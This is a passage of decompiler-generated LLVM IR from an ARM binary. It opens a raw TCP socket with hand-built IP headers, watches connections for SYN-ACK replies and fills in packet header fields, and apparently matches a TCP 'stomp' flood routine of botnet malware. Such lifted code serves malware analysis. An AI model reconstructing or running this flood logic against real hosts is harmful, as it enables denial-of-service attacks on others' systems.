  %v3_b7f8 = mul i32 %v6_b7f0, 65536
  store i32 %v3_b7f8, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b804 = load i32, i32* @r4, align 4
  store i32 %v0_b804, i32* %r0.global-to-local, align 4
  %v4_b808 = inttoptr i32 %v0_b7f4 to i32*
  %v5_b808 = call i32 @function_a4e8(i32 %v0_b804, i32* %v4_b808, i32 11, i32 0)
  %v1_b810 = urem i32 %v5_b808, 256
  store i32 %v1_b810, i32* %ip.global-to-local, align 4
  %v0_b814 = load i32, i32* @r5, align 4
  store i32 %v0_b814, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b820 = load i32, i32* @r4, align 4
  store i32 %v0_b820, i32* %r0.global-to-local, align 4
  %v5_b828 = inttoptr i32 %v0_b814 to i32*
  %v6_b828 = call i32 @function_a4e8(i32 %v0_b820, i32* %v5_b828, i32 12, i32 1)
  %v1_b830 = urem i32 %v6_b828, 256
  store i32 %v1_b830, i32* %ip.global-to-local, align 4
  %v0_b834 = load i32, i32* @r5, align 4
  store i32 %v0_b834, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b840 = load i32, i32* @r4, align 4
  store i32 %v0_b840, i32* %r0.global-to-local, align 4
  %v5_b848 = inttoptr i32 %v0_b834 to i32*
  %v6_b848 = call i32 @function_a4e8(i32 %v0_b840, i32* %v5_b848, i32 13, i32 1)
  %v1_b850 = urem i32 %v6_b848, 256
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_b854 = load i32, i32* @r5, align 4
  store i32 %v0_b854, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b860 = load i32, i32* @r4, align 4
  store i32 %v0_b860, i32* %r0.global-to-local, align 4
  %v5_b868 = inttoptr i32 %v0_b854 to i32*
  %v6_b868 = call i32 @function_a4e8(i32 %v0_b860, i32* %v5_b868, i32 14, i32 0)
  %v1_b870 = urem i32 %v6_b868, 256
  store i32 %v1_b870, i32* %ip.global-to-local, align 4
  %v0_b874 = load i32, i32* @r5, align 4
  store i32 %v0_b874, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b880 = load i32, i32* @r4, align 4
  store i32 %v0_b880, i32* %r0.global-to-local, align 4
  %v5_b888 = inttoptr i32 %v0_b874 to i32*
  %v6_b888 = call i32 @function_a4e8(i32 %v0_b880, i32* %v5_b888, i32 15, i32 0)
  %v1_b890 = urem i32 %v6_b888, 256
  store i32 %v1_b890, i32* %ip.global-to-local, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 %v0_b894, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8a0 = load i32, i32* @r4, align 4
  store i32 %v0_b8a0, i32* %r0.global-to-local, align 4
  %v5_b8a8 = inttoptr i32 %v0_b894 to i32*
  %v6_b8a8 = call i32 @function_a4e8(i32 %v0_b8a0, i32* %v5_b8a8, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_b8a8, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r5, align 4
  store i32 %v0_b8b8, i32* %r1.global-to-local, align 4
  %v0_b8bc = load i32, i32* @r4, align 4
  store i32 %v0_b8bc, i32* %r0.global-to-local, align 4
  %v1_b8c0 = urem i32 %v6_b8a8, 256
  store i32 %v1_b8c0, i32* @r8, align 4
  %v4_b8c4 = inttoptr i32 %v0_b8b8 to i32*
  %v5_b8c4 = call i32 @function_a4e8(i32 %v0_b8bc, i32* %v4_b8c4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b8d0 = load i32, i32* @r5, align 4
  store i32 %v0_b8d0, i32* %r1.global-to-local, align 4
  store i32 %v5_b8c4, i32* @sb, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v4_b8dc = inttoptr i32 %v0_b8d0 to i32*
  %v5_b8dc = call i32 @function_a4e8(i32 %v0_b8d8, i32* %v4_b8dc, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_b8e8 = urem i32 %v5_b8dc, 256
  store i32 %v1_b8e8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b8f8 = call i32 @function_13790(i32 2, i32 3, i32 6)
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_b8fc = load i32, i32* @r7, align 4
  %v3_b8fc = udiv i32 %v0_b8fc, 65536
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  %v7_b900 = icmp eq i32 %v3_b8f8, -1
  store i1 %v7_b900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b900, label %dec_label_pc_bb5c, label %dec_label_pc_b910

dec_label_pc_b910:                                ; preds = %dec_label_pc_b728
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b918 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b918, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b92c = call i32 @function_13760(i32 %v3_b8f8, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b92c, i32* %r0.global-to-local, align 4
  %v7_b930 = icmp eq i32 %v6_b92c, -1
  store i1 %v7_b930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b930, label %dec_label_pc_bb54, label %dec_label_pc_b938

dec_label_pc_b938:                                ; preds = %dec_label_pc_b910
  %v0_b938 = load i32, i32* @fp, align 4
  %v2_b938 = icmp eq i32 %v0_b938, 0
  store i1 %v2_b938, i1* %cpsr_z.global-to-local, align 1
  %v0_b93c = load i32, i32* @r6, align 4
  %v3_b93c = mul i32 %v0_b93c, 65536
  store i32 %v3_b93c, i32* %r0.global-to-local, align 4
  %v3_b940 = urem i32 %v0_b93c, 65536
  store i32 %v3_b940, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_b938, 1
  br i1 %tmp72, label %.thread18, label %dec_label_pc_b964.preheader

.thread18:                                        ; preds = %dec_label_pc_b938
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bde8

dec_label_pc_b964.preheader:                      ; preds = %dec_label_pc_b938
  %v5_b948 = load i32, i32* @r7, align 4
  %v8_b948 = udiv i32 %v5_b948, 16777216
  %tmp73 = udiv i32 %v0_b93c, 256
  %v8_b94c = urem i32 %tmp73, 256
  store i32 %v8_b94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v9_ba50 = icmp eq i32 %v3_b8fc, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_ba74 = ptrtoint i32* %stack_var_-60 to i32
  %v3_ba80 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_bab0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_bab4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bab8 = ptrtoint i32* %stack_var_-332 to i32
  %v4_bb04 = zext i8 %tmp31 to i32
  %v4_bb08 = zext i8 %tmp30 to i32
  %v4_bb14 = mul nuw nsw i32 %v4_bb08, 256
  %v4_bb24 = zext i8 %tmp to i32
  %v1_bb28 = and i32 %v4_bb24, 18
  %v2_bb2c = icmp eq i32 %v1_bb28, 18
  %v1_ba60 = mul nuw nsw i32 %v3_b8fc, 256
  %v4_ba64 = and i32 %v1_ba60, 65280
  %v5_ba64 = or i32 %v8_b948, %v4_ba64
  %v3_ba6893 = udiv i32 %v4_ba64, 256
  %v1_ba6c = trunc i32 %v3_ba6893 to i8
  %v1_bc30 = mul i32 %v0_b93c, 256
  %v4_bc38 = and i32 %v1_bc30, 65280
  %sext = mul i32 %v6_b770, 16777216
  %v4_bc48 = sdiv i32 %sext, 16777216
  %sext5 = mul i32 %v5_b7ac, 16777216
  %v4_bc6c = sdiv i32 %sext5, 16777216
  %v5_bb14 = or i32 %v4_bb04, %v4_bb14
  %v1_bb34 = and i32 %v4_bb24, 5
  %v2_bb34 = icmp eq i32 %v1_bb34, 0
  %v1_ba70 = trunc i32 %v8_b948 to i8
  %v5_bc38 = or i32 %v8_b94c, %v4_bc38
  %v1_bc58 = trunc i32 %v4_bc48 to i8
  %v1_bd38 = urem i32 %v5_b808, 2
  %tmp94 = sub nsw i32 0, %v1_bd38
  %v4_bd40 = and i32 %tmp94, 32
  %v1_bd50 = urem i32 %v6_b828, 2
  %tmp95 = sub nsw i32 0, %v1_bd50
  %v4_bd58 = and i32 %tmp95, 16
  %v1_bd68 = urem i32 %v6_b848, 2
  %tmp96 = sub nsw i32 0, %v1_bd68
  %v4_bd70 = and i32 %tmp96, 8
  %v1_bd80 = urem i32 %v6_b868, 2
  %tmp97 = sub nsw i32 0, %v1_bd80
  %v4_bd88 = and i32 %tmp97, 4
  %v1_bd98 = urem i32 %v6_b888, 2
  %tmp98 = sub nsw i32 0, %v1_bd98
  %v3_bda0 = and i32 %tmp98, 2
  br label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bb3c, %dec_label_pc_b964.preheader
  store i32 %v8_b94c, i32* %r3.global-to-local, align 4
  %v0_b970 = load i32, i32* @sb, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* @sl, align 4
  br label %dec_label_pc_b974

dec_label_pc_b974:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_b964
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b980 = call i32 @function_13790(i32 2, i32 1, i32 0)
  store i32 %v3_b980, i32* %r0.global-to-local, align 4
  %v7_b984 = icmp eq i32 %v3_b980, -1
  store i1 %v7_b984, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b980, i32* @r7, align 4
  br i1 %v7_b984, label %dec_label_pc_bdd4, label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %dec_label_pc_b974
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b998 = call i32 @function_12dac(i32 %v3_b980, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b9a0 = or i32 %v2_b998, 2048
  store i32 %v1_b9a0, i32* @r2, align 4
  %v0_b9a4 = load i32, i32* @r7, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v2_b9a8 = call i32 @function_12dac(i32 %v0_b9a4, i32 4)
  store i32 %v2_b9a8, i32* %r0.global-to-local, align 4
  %v3_b9ac = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_b9bc = mul i32 %v3_b9ac, 24
  store i32 %v5_b9bc, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_b9cc = add i32 %v5_b9bc, %arg2
  store i32 %v2_b9cc, i32* %r2.global-to-local, align 4
  %v1_b9d0 = add i32 %v2_b9cc, 20
  %v2_b9d0 = inttoptr i32 %v1_b9d0 to i8*
  %v3_b9d0 = load i8, i8* %v2_b9d0, align 1
  %v4_b9d0 = zext i8 %v3_b9d0 to i32
  store i32 %v4_b9d0, i32* %r3.global-to-local, align 4
  %v2_b9d4 = icmp ugt i8 %v3_b9d0, 30
  %v7_b9d4 = icmp eq i8 %v3_b9d0, 31
  store i1 %v7_b9d4, i1* %cpsr_z.global-to-local, align 1
  %v2_b9d8 = xor i1 %v7_b9d4, true
  %v3_b9d8 = and i1 %v2_b9d4, %v2_b9d8
  %v5_b9d8 = add i32 %v2_b9cc, 16
  %v6_b9d8 = inttoptr i32 %v5_b9d8 to i32*
  %v7_b9d8 = load i32, i32* %v6_b9d8, align 4
  br i1 %v3_b9d8, label %dec_label_pc_ba44, label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b990
  store i32 %v7_b9d8, i32* @r4, align 4
  %v0_b9e8 = call i32 @function_fe24()
  store i32 %v0_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_b9f8 = mul i32 %v3_b9ec, 24
  %v0_b9fc = load i32, i32* @r4, align 4
  %v2_ba00 = add i32 %v5_b9f8, %arg2
  store i32 %v2_ba00, i32* %r1.global-to-local, align 4
  %v1_ba04 = and i32 %v0_b9fc, 65280
  store i32 %v1_ba04, i32* %r3.global-to-local, align 4
  %v1_b9fc = udiv i32 %v0_b9fc, 256
  %v3_ba08 = and i32 %v1_b9fc, 65280
  store i32 %v3_ba08, i32* %r2.global-to-local, align 4
  %v3_ba0c = mul i32 %v0_b9fc, 16777216
  store i32 %v3_ba0c, i32* %ip.global-to-local, align 4
  %v1_ba10 = add i32 %v2_ba00, 20
  %v2_ba10 = inttoptr i32 %v1_ba10 to i8*
  %v3_ba10 = load i8, i8* %v2_ba10, align 1
  %v4_ba10 = zext i8 %v3_ba10 to i32
  store i32 %v4_ba10, i32* %lr.global-to-local, align 4
  %v4_ba14 = mul nuw nsw i32 %v1_ba04, 256
  %v5_ba14 = or i32 %v4_ba14, %v3_ba0c
  store i32 %v5_ba14, i32* %ip.global-to-local, align 4
  %v2_ba1c = call i32 @llvm.bswap.i32(i32 %v0_b9fc)
  %v7_ba20 = lshr i32 %v0_b9e8, %v4_ba10
  %v8_ba20 = add i32 %v7_ba20, %v2_ba1c
  store i32 %v8_ba20, i32* %r2.global-to-local, align 4
  %v3_ba2c = mul i32 %v8_ba20, 16777216
  %v1_ba30 = and i32 %v8_ba20, 65280
  store i32 %v1_ba30, i32* %r0.global-to-local, align 4
  %v4_ba34 = mul nuw nsw i32 %v1_ba30, 256
  %v5_ba34 = or i32 %v4_ba34, %v3_ba2c
  store i32 %v5_ba34, i32* %r1.global-to-local, align 4
  %v2_ba3c = call i32 @llvm.bswap.i32(i32 %v8_ba20)
  br label %dec_label_pc_ba44

dec_label_pc_ba44:                                ; preds = %dec_label_pc_b990, %dec_label_pc_b9e4
  %storemerge25 = phi i32 [ %v2_ba3c, %dec_label_pc_b9e4 ], [ %v7_b9d8, %dec_label_pc_b990 ]
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_ba50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ba50, label %dec_label_pc_bb64, label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba44
  store i32 %v8_b948, i32* %ip.global-to-local, align 4
  store i32 %v5_ba64, i32* %r3.global-to-local, align 4
  store i32 %v3_ba6893, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_bb64, %dec_label_pc_ba58
  %stack_var_-57.0 = phi i8 [ %v1_bb6c, %dec_label_pc_bb64 ], [ %v1_ba6c, %dec_label_pc_ba58 ]
  %storemerge = phi i8 [ %v1_bb64, %dec_label_pc_bb64 ], [ %v1_ba70, %dec_label_pc_ba58 ]
  store i32 %v2_ba74, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r7, align 4
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  %v4_ba80 = call i32 @function_135ec(i32 %v0_ba7c, %sockaddr* nonnull %v3_ba80, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ba88 = call i32 @function_1316c(i32* null)
  store i32 %v2_ba88, i32* %r0.global-to-local, align 4
  store i32 %v2_ba88, i32* @r4, align 4
  %v9_bae8 = icmp eq i32 %tmp32, %storemerge25
  %v4_bb0c = zext i8 %storemerge to i32
  %v4_bb10 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_bae8 to i32
  %v9_bafc = icmp eq i1 %v9_bae8, false
  %v4_bb18 = mul nuw nsw i32 %v4_bb10, 256
  %v5_bb18 = or i32 %v4_bb18, %v4_bb0c
  %v9_bb1c = icmp eq i32 %v5_bb18, %v5_bb14
  br label %dec_label_pc_baa4

dec_label_pc_ba94:                                ; preds = %.thread23, %dec_label_pc_bb04, %dec_label_pc_bb34, %bb75
  %v2_ba94 = call i32 @function_1316c(i32* null)
  %v0_ba98 = load i32, i32* @r4, align 4
  %v2_ba98 = sub i32 %v2_ba94, %v0_ba98
  store i32 %v2_ba98, i32* %r0.global-to-local, align 4
  %v7_ba9c = icmp eq i32 %v2_ba98, 10
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  %v8_baa0 = icmp sgt i32 %v2_ba98, 10
  br i1 %v8_baa0, label %dec_label_pc_bb48, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba94, %dec_label_pc_ba74
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_bab0, i32* %lr.global-to-local, align 4
  store i32 %v2_bab4, i32* %ip.global-to-local, align 4
  store i32 %v2_bab8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v7_bacc = call i32 @function_136cc(i32 %v3_b8f8, i32* nonnull %stack_var_-332, i32 256, i32 16384, i32 %v2_bab0, i32 %v2_bab4)
  store i32 %v7_bacc, i32* %r2.global-to-local, align 4
  %v7_bad4 = icmp eq i32 %v7_bacc, -1
  store i1 %v7_bad4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_bad4, label %dec_label_pc_bb5c, label %dec_label_pc_bae0

dec_label_pc_bae0:                                ; preds = %dec_label_pc_baa4
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_baf4 = icmp eq i32 %v7_bacc, 40
  store i1 %v7_baf4, i1* %cpsr_z.global-to-local, align 1
  %tmp99 = icmp ult i32 %v7_bacc, 41
  br i1 %tmp99, label %.thread23, label %bb75

.thread23:                                        ; preds = %dec_label_pc_bae0
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ba94

bb75:                                             ; preds = %dec_label_pc_bae0
  store i1 %v9_bafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bafc, label %dec_label_pc_ba94, label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %bb75
  store i32 %v4_bb08, i32* %r1.global-to-local, align 4
  store i32 %v4_bb0c, i32* %ip.global-to-local, align 4
  store i32 %v4_bb10, i32* %r2.global-to-local, align 4
  store i32 %v5_bb14, i32* %r3.global-to-local, align 4
  store i32 %v5_bb18, i32* @r5, align 4
  store i1 %v9_bb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bb1c, label %dec_label_pc_bb24, label %dec_label_pc_ba94

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bb04
  store i32 %v4_bb24, i32* %r2.global-to-local, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  store i1 %v2_bb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb2c, label %dec_label_pc_bb78, label %dec_label_pc_bb34

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bb24
  store i1 %v2_bb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb34, label %dec_label_pc_ba94, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb34
  %v0_bb3c = load i32, i32* @r7, align 4
  store i32 %v0_bb3c, i32* %r0.global-to-local, align 4
  %v1_bb40 = call i32 @function_12e9c(i32 %v0_bb3c)
  store i32 %v1_bb40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b964

dec_label_pc_bb48:                                ; preds = %dec_label_pc_ba94
  %v0_bb48 = load i32, i32* @r7, align 4
  store i32 %v0_bb48, i32* %r0.global-to-local, align 4
  %v1_bb4c = call i32 @function_12e9c(i32 %v0_bb48)
  store i32 %v1_bb4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b974

dec_label_pc_bb54:                                ; preds = %dec_label_pc_b910
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v1_bb58 = call i32 @function_12e9c(i32 %v3_b8f8)
  store i32 %v1_bb58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb5c

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_b728, %dec_label_pc_bb54
  %v29_bb60 = phi i32 [ %v3_b8f8, %dec_label_pc_b728 ], [ %v1_bb58, %dec_label_pc_bb54 ], [ 0, %dec_label_pc_baa4 ]
  ret i32 %v29_bb60

dec_label_pc_bb64:                                ; preds = %dec_label_pc_ba44
  %v0_bb64 = call i32 @function_fe24()
  %v1_bb64 = trunc i32 %v0_bb64 to i8
  store i32 %v0_bb64, i32* %r0.global-to-local, align 4
  %v4_bb68 = sdiv i32 %v0_bb64, 256
  store i32 %v4_bb68, i32* %r3.global-to-local, align 4
  %v1_bb6c = trunc i32 %v4_bb68 to i8
  br label %dec_label_pc_ba74

dec_label_pc_bb78:                                ; preds = %dec_label_pc_bb24
  %v3_bb78 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bb78, i32* @r4, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_bb80 = mul i32 %v3_bb78, 16
  store i32 %v3_bb80, i32* %ip.global-to-local, align 4
  %v3_bb84 = add i32 %v3_bb80, %v2_b748
  %v4_bb84 = inttoptr i32 %v3_bb84 to i32*
  store i32 %storemerge25, i32* %v4_bb84, align 4
  %v0_bb88 = load i32, i32* @r6, align 4
  %v1_bb88 = add i32 %v0_bb88, 4
  %v2_bb88 = inttoptr i32 %v1_bb88 to i32*
  %v3_bb88 = load i32, i32* %v2_bb88, align 4
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  %v1_bb90 = and i32 %v3_bb88, 65280
  store i32 %v1_bb90, i32* %r1.global-to-local, align 4
  store i32 %v2_b748, i32* %lr.global-to-local, align 4
  %v3_bb98 = mul i32 %v3_bb88, 16777216
  %v4_bba0 = mul nuw nsw i32 %v1_bb90, 256
  %v5_bba0 = or i32 %v4_bba0, %v3_bb98
  store i32 %v5_bba0, i32* %r2.global-to-local, align 4
  %v1_bba8 = load i32, i32* %ip.global-to-local, align 4
  %v2_bba8 = add i32 %v1_bba8, %v2_b748
  store i32 %v2_bba8, i32* %ip.global-to-local, align 4
  %v2_bbac = call i32 @llvm.bswap.i32(i32 %v3_bb88)
  store i32 %v2_bbac, i32* %r3.global-to-local, align 4
  %v2_bbb0 = add i32 %v2_bba8, 4
  %v3_bbb0 = inttoptr i32 %v2_bbb0 to i32*
  store i32 %v2_bbac, i32* %v3_bbb0, align 4
  %v0_bbb4 = load i32, i32* @r6, align 4
  %v1_bbb4 = add i32 %v0_bbb4, 8
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r0.global-to-local, align 4
  %v1_bbbc = and i32 %v3_bbb4, 65280
  store i32 %v1_bbbc, i32* %r1.global-to-local, align 4
  %v3_bbc0 = mul i32 %v3_bbb4, 16777216
  %v4_bbc8 = mul nuw nsw i32 %v1_bbbc, 256
  %v5_bbc8 = or i32 %v4_bbc8, %v3_bbc0
  store i32 %v5_bbc8, i32* %r2.global-to-local, align 4
  %v2_bbd0 = call i32 @llvm.bswap.i32(i32 %v3_bbb4)
  store i32 %v2_bbd0, i32* %r3.global-to-local, align 4
  %v1_bbd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bbd4 = add i32 %v1_bbd4, 8
  %v3_bbd4 = inttoptr i32 %v2_bbd4 to i32*
  store i32 %v2_bbd0, i32* %v3_bbd4, align 4
  %v0_bbd8 = load i32, i32* @r6, align 4
  %v1_bbd8 = inttoptr i32 %v0_bbd8 to i32*
  %v2_bbd8 = load i32, i32* %v1_bbd8, align 4
  %v3_bbdc = udiv i32 %v2_bbd8, 65536
  store i32 %v3_bbdc, i32* %r2.global-to-local, align 4
  %v3_bbe03 = udiv i32 %v2_bbd8, 16777216
  store i32 %v3_bbe03, i32* %r1.global-to-local, align 4
  %v0_bbe4 = load i32, i32* @r5, align 4
  %v3_bbe4 = sdiv i32 %v0_bbe4, 256
  store i32 %v3_bbe4, i32* %r3.global-to-local, align 4
  %v1_bbe8 = trunc i32 %v3_bbe4 to i8
  %v2_bbe8 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbe8 = add i32 %v2_bbe8, 15
  %v4_bbe8 = inttoptr i32 %v3_bbe8 to i8*
  store i8 %v1_bbe8, i8* %v4_bbe8, align 1
  %v0_bbec = load i32, i32* %r1.global-to-local, align 4
  %v1_bbec = trunc i32 %v0_bbec to i8
  %v2_bbec = load i32, i32* %ip.global-to-local, align 4
  %v3_bbec = add i32 %v2_bbec, 13
  %v4_bbec = inttoptr i32 %v3_bbec to i8*
  store i8 %v1_bbec, i8* %v4_bbec, align 1
  %v0_bbf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bbf0 = trunc i32 %v0_bbf0 to i8
  %v2_bbf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf0 = add i32 %v2_bbf0, 12
  %v4_bbf0 = inttoptr i32 %v3_bbf0 to i8*
  store i8 %v1_bbf0, i8* %v4_bbf0, align 1
  %v0_bbf4 = load i32, i32* @r5, align 4
  %v1_bbf4 = trunc i32 %v0_bbf4 to i8
  %v2_bbf4 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf4 = add i32 %v2_bbf4, 14
  %v4_bbf4 = inttoptr i32 %v3_bbf4 to i8*
  store i8 %v1_bbf4, i8* %v4_bbf4, align 1
  %v0_bbf8 = load i32, i32* @sl, align 4
  store i32 %v0_bbf8, i32* %r0.global-to-local, align 4
  %v1_bbfc = call i32 @function_13940(i32 %v0_bbf8)
  store i32 %v1_bbfc, i32* %r0.global-to-local, align 4
  store i32 %v2_b758, i32* %r1.global-to-local, align 4
  %v3_bc04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc04, i32* %r2.global-to-local, align 4
  %v2_bc08 = load i32, i32* @r4, align 4
  %v5_bc08 = mul i32 %v2_bc08, 4
  %v6_bc08 = add i32 %v5_bc08, %v2_b758
  %v7_bc08 = inttoptr i32 %v6_bc08 to i32*
  store i32 %v1_bbfc, i32* %v7_bc08, align 4
  %v0_bc0c = load i32, i32* %r1.global-to-local, align 4
  %v1_bc0c = load i32, i32* %r2.global-to-local, align 4
  %v4_bc0c = mul i32 %v1_bc0c, 4
  %v5_bc0c = add i32 %v4_bc0c, %v0_bc0c
  %v6_bc0c = inttoptr i32 %v5_bc0c to i32*
  %v7_bc0c = load i32, i32* %v6_bc0c, align 4
  store i32 %v7_bc0c, i32* @r4, align 4
  %v1_bc10 = inttoptr i32 %v7_bc0c to i8*
  %v2_bc10 = load i8, i8* %v1_bc10, align 1
  %tmp100 = urem i8 %v2_bc10, 16
  %v1_bc14 = zext i8 %tmp100 to i32
  %v1_bc18 = or i32 %v1_bc14, 64
  store i32 %v1_bc18, i32* %r3.global-to-local, align 4
  %v1_bc1c = trunc i32 %v1_bc18 to i8
  store i8 %v1_bc1c, i8* %v1_bc10, align 1
  %v0_bc20 = load i32, i32* @r4, align 4
  %v1_bc20 = inttoptr i32 %v0_bc20 to i8*
  %v2_bc20 = load i8, i8* %v1_bc20, align 1
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v1_bc2c = and i8 %v2_bc20, -16
  %v1_bc34 = or i8 %v1_bc2c, 5
  store i32 %v5_bc38, i32* %r0.global-to-local, align 4
  %v0_bc3c = load i32, i32* @sl, align 4
  %v3_bc3c = mul i32 %v0_bc3c, 65536
  store i32 %v3_bc3c, i32* %r2.global-to-local, align 4
  store i32 %v1_b7d8, i32* %lr.global-to-local, align 4
  store i8 %v1_bc34, i8* %v1_bc20, align 1
  store i32 %v4_bc48, i32* %r1.global-to-local, align 4
  %v0_bc4c = load i32, i32* %r2.global-to-local, align 4
  %v3_bc4c = udiv i32 %v0_bc4c, 65536
  %v1_bc50 = urem i32 %v3_bc4c, 256
  store i32 %v1_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = udiv i32 %v0_bc4c, 16777216
  store i32 %v3_bc54, i32* %r2.global-to-local, align 4
  %v2_bc58 = load i32, i32* @r4, align 4
  %v3_bc58 = add i32 %v2_bc58, 1
  %v4_bc58 = inttoptr i32 %v3_bc58 to i8*
  store i8 %v1_bc58, i8* %v4_bc58, align 1
  %v0_bc5c = load i32, i32* %r2.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %v4_bc5c = mul i32 %v1_bc5c, 256
  %v5_bc5c = or i32 %v4_bc5c, %v0_bc5c
